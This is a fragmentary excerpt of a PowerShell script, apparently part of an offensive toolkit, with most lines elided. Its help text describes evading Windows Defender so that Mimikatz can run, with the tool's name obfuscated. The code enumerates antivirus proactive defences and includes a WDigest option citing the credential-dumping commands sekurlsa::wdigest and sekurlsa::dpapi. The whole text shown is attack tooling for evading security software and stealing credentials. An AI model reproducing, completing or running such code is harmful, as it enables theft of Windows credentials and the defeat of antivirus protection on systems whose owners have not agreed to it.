...
.NOTES
   ...
   REMARK: This cmdlet only bypasses M[i]mika[t]z detection if W$ Defender its the only AV running ..
...
.Parameter Force
   Bypass disable proactive defence to run M[i]mika[t]z (default: false)
...
If($ManyCats.IsPresent)
{
   ...
   ## Enumerate Anti-Virus Proactive defence running
   ...
   ForEach($Item in $Regex)
   {
      ...
      If($Testme -iMatch "$Item")
      {
         ...
         write-host "] Disable proactive defence to run $Obfuscation.`n" -ForegroundColor Red

         If($Force -Match '^(false)$')
         {
            cd "$Ipath"
   ...
   If($Wdigest -Match '^(true)$')
   {
      ...
      # net::group sekurlsa::wdigest sekurlsa::dpapi
